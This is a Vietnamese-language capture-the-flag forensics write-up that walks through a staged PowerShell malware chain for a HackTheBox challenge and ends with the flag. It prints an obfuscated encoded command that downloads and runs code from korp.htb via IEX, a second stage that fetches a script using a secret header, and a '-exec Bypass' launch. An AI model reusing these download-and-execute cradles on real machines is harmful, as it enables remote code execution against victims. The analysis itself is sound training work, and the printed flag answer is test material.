---
title: Thorin’s Amulet

---

# Thorin’s Amulet - powershell

## Description

Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

----
> written by 9r3y
## Thought process
Khi unzip file đề bài cho, ta được 1 PowerShell script:
```bash
$ unzip forensics_thorins_amulet.zip 
Archive:  forensics_thorins_amulet.zip
  inflating: artifact.ps1
```
```bash
$ cat artifact.ps1 
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```
Script này thực hiện khai báo 1 hàm tên "qt4PO", sau đó kiểm tra nếu profile của máy chứa nó có match với "WORKSTATION-DM-0043". Nếu match, 1 PowerShell mới sẽ được gọi ra và thực hiện đoạn command``SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=``
Ở đây, argument ``-NoProfile -NonInteractive`` đảm bảo PowerShell được gọi ra là một PowerShell mặc định và không bị tác động bởi user. 

Decode đoạn command được mã hóa base64 trên:
```bash
$ echo "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=" | base64 -d
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```
Output thực chất là một PowerShell command thực hiện download nội dung chứa trong "http://korp.htb/update" và tiếp tục chạy nội dung đó dưới dạng PowerShell script bằng lệnh IEX.
Thay "korp.htb" bằng docker IP address & port cung cấp bởi challenge để inspect nội dung trong URL trên:
```bash
$ curl http://94.237.57.114:51856/update
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```
Địa chỉ tại URL trên host 1 PowerShell script khác. Script này tiếp tục gọi đến URL "http://korp.htb/a541a" và thực hiện download 1 file, lưu tên là "a541a.ps1", sau đó gọi 1 PowerShell khác để chạy file này. 
Có thể thấy để truy cập được vào URL "http://korp.htb/a541a", cần có header ``"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"`` (trả về "403 Forbidden" nếu chỉ đơn thuần truy cập vào "http://korp.htb/a541a" trên browser). 
Attacker đặt ra header như vậy mục đích để tránh malware bị phát hiện thông qua inspect trên browser. Thay vào đó, nội dung của website tại URL đó đóng vai trò chính là PowerShell script để attacker thực hiện Remote code execution (RCE) khi nạn nhân fetch những nội dung đó về.
Vậy tóm lại, scenario này là 1 chuỗi RCE fetch về PowerShell scripts từ các URL 

Để curl 1 URL mà yêu cầu custom header, 
```bash
$ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" 94.237.48.147:44686/a541a
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```
PowerShell script cuối cùng này gán 1 đoạn hex-encoded string vào biến $a35, sau đó tiến hành decode hex: tách string ra thành từng cặp 2 kí tự (`split"(..)"`), lọc các khoảng trống `(?{$_})`, chuyển đổi từng cặp giá trị hex sang decimal rồi sang ASCII. Kết quả nhận được là flag:
```bash
$ echo 4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d | xxd -r -p
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```
`HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`




